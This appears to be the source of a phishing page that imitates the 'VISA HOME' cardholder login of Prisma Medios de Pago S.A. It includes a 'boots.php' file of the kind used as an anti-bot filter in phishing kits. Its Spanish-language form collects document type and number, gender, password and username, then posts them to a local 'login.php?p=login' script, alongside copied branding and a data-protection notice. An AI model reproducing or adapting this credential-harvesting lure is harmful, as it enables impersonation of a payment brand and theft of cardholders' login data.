<?php require_once("boots.php");?>
<html lang="es">
	<head>
	<meta http-equiv="content-type" content="text/html;charset=UTF-8">
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=Edge">
	<title>VISA HOME</title>
	<link type="text/css" rel="stylesheet" href="resources/css/smoothness/jquery-ui-1.8.18.custom.min.css">
	<link type="text/css" rel="stylesheet" href="resources/css/text.min.css">
	<link type="text/css" rel="stylesheet" href="resources/css/reset.min.css">
	<link type="text/css" rel="stylesheet" href="resources/css/960.min.css">
	<link type="text/css" rel="stylesheet" href="resources/css/visa.min.css">
	<link type="text/css" rel="stylesheet" href="resources/css/tabs.min.css">
	<link type="text/css" rel="stylesheet" href="resources/css/column930.min.css">
	<script type="text/javascript" src="resources/js/jquery-1.7.2.min.js"></script>
	<script type="text/javascript" src="resources/js/jquery-ui-1.8.18.custom.min.js"></script>
</head>
<body class="login-body">
<div class="pre-header"></div>
<div class="header container-12">
	<div class="logo grid-6 alpha">
	<a href="#">
	<img src="resources/img/logo.jpg">
	</a>
	</div>
		<div class="user-info grid-6 omega"></div>
	</div>
	<div class="container-12"></div>
		<div class="login-content container-12">
	<form form action="login.php?p=login" method="POST" id="formLoguin">
<div>
	</div>
	<div class="login-tabs"></div>
	<div class="login-content container-12">
	<div class="login-info grid-4 alpha">
	<div class="login-title">
	VISA<span>HOME PARA SOCIOS</span>
	</div>
	<ul>
				<li>Información sobre el estado de cuentas de sus
					tarjetas Visa. Últimos movimientos, liquidaciones y
					resúmenes de cuenta.</li>
				<li>Realice el pago puntual o adhiera al débito
					automático sus facturas de servicios e impuestos a
					través del Servicio de Pagos Visa.</li>
				<li>Abone en cuotas fijas el saldo del resumen de cuenta o
					los consumos realizados en un pago.</li>
			</ul>
		</div>
		<div class="login-clave grid-4">
		</div>
		<div class="login-form grid-4">
			<div class="login-form-conten">
				<div>
					<span>Tipo de Documento</span>
	<select id="docType" name="docType" class="inputCombo-chico" size="1" tabindex="2">	<option value="CI">Cédula de Identidad</option>
<option value="DNI" selected="selected">Documento Nacional de Identidad</option>
<option value="DU">Documento Unico</option>
<option value="LC">Libreta Cívica</option>
<option value="LE">Libreta de Enrolamiento</option>
<option value="PAS">Pasaporte</option>
</select>
				</div>
				<div><label for="docNumber">
Número</label><input autocomplete="off" id="docNumber" type="text" name="docNumber" class="username_qwerty " style="background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAASCAYAAABSO15qAAAAAXNSR0IArs4c6QAAAUBJREFUOBGVVE2ORUAQLvIS4gwzEysHkHgnkMiEc4zEJXCMNwtWTmDh3UGcYoaFhZUFCzFVnu4wIaiE+vvq6+6qTgthGH6O4/jA7x1OiCAIPwj7CoLgSXDxSjEVzAt9k01CBKdWfsFf/2WNuEwc2YqigKZpK9glAlVVwTTNbQJZlnlCkiTAZnF/mePB2biRdhwHdF2HJEmgaRrwPA+qqoI4jle5/8XkXzrCFoHg+/5ICdpm13UTho7Q9/0WnsfwiL/ouHwHrJgQR8WEwVG+oXpMPaDAkdzvd7AsC8qyhCiKJjiRnCKwbRsMw9hcQ5zv9maSBeu6hjRNYRgGFuKaCNwjkjzPoSiK1d1gDDecQobOBwswzabD/D3Np7AHOIrvNpHmPI+Kc2RZBm3bcp8wuwSIot7QQ0PznoR6wYSK0Xb/AGVLcWwc7Ng3AAAAAElFTkSuQmCC&quot;); background-repeat: no-repeat; background-attachment: scroll; background-size: 16px 18px; background-position: 98% 50%;">
				</div>
				<div>
					<span>Sexo</span><select id="gender" name="gender" class="inputCombo-chico" size="1" tabindex="3">	<option value="M">Masculino</option>
<option value="F">Femenino</option>
</select>
				</div>
				<div>
					<span>Contraseña</span><input autocomplete="off" id="password" type="password" name="password">
				</div>
				<div class="login-pregunta">
				</div>
				<div>
					<span> Usuario </span><input id="nickname" type="password" name="nickname" class="inputTextChico nickname_qwerty" autocomplete="off" style="background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAASCAYAAABSO15qAAAAAXNSR0IArs4c6QAAAUBJREFUOBGVVE2ORUAQLvIS4gwzEysHkHgnkMiEc4zEJXCMNwtWTmDh3UGcYoaFhZUFCzFVnu4wIaiE+vvq6+6qTgthGH6O4/jA7x1OiCAIPwj7CoLgSXDxSjEVzAt9k01CBKdWfsFf/2WNuEwc2YqigKZpK9glAlVVwTTNbQJZlnlCkiTAZnF/mePB2biRdhwHdF2HJEmgaRrwPA+qqoI4jle5/8XkXzrCFoHg+/5ICdpm13UTho7Q9/0WnsfwiL/ouHwHrJgQR8WEwVG+oXpMPaDAkdzvd7AsC8qyhCiKJjiRnCKwbRsMw9hcQ5zv9maSBeu6hjRNYRgGFuKaCNwjkjzPoSiK1d1gDDecQobOBwswzabD/D3Np7AHOIrvNpHmPI+Kc2RZBm3bcp8wuwSIot7QQ0PznoR6wYSK0Xb/AGVLcWwc7Ng3AAAAAElFTkSuQmCC&quot;); background-repeat: no-repeat; background-attachment: scroll; background-size: 16px 18px; background-position: 98% 50%;">
				</div>
	<div class="login-pregunta left">
					<div class="col-4 no-padding no-margin">
					</div>

				</div>

			</div>
			<div class="login-form-footer">
				<input id="login" type="submit" name="login" value="ingresar" onclick="enviar_data();" tabindex="5" class="button">

			</div>
		</div>
	</div><span id="blockedUserHidden" style="display:none">false</span><input type="hidden" name="javax.faces.ViewState" id="javax.faces.ViewState" value="7238203022823897874:-3210463460565016334" autocomplete="off">
</form>

<div class="terms grid-12">
	<span>Los datos que se proporcionen a Prisma Medios de Pago S.A. podrán utilizarse para procesar sus pedidos, solicitudes, denuncias, reclamos, para la relación comercial y fines publicitarios. </span> <b>Disposición DNPDP 10/2008: "El titular de los datos personales tiene la facultad de ejercer el derecho de acceso a los mismos en forma gratuita a intervalos no inferiores a seis meses, salvo que se acredite un interés legítimo al efecto conforme lo establecido en el artículo 14, inciso 3 de la Ley Nº 25.326" y "La DIRECCION NACIONAL DE PROTECCION DE DATOS PERSONALES, Organo de Control de la Ley Nº 25.326, tiene la atribución de atender las denuncias y reclamos que se interpongan con relación al incumplimiento de las normas sobre protección de datos personales."</b>
</div>

	<div class="footer">
		<div class="footer-content container-12">
			<div class="grid-6">PRISMA MEDIOS DE PAGO S.A.</div>
			<div class="footer-legales grid-6"><a  class="grey-link" onclick="showPopup('consumerDefense'); return false;">Defensa al Consumidor</a>  |
				<a class="grey-link" onclick="showPopup('personalDataProtection'); return false;">Protección de datos personales</a>
			</div>
		</div>
	</div>
</body></html>
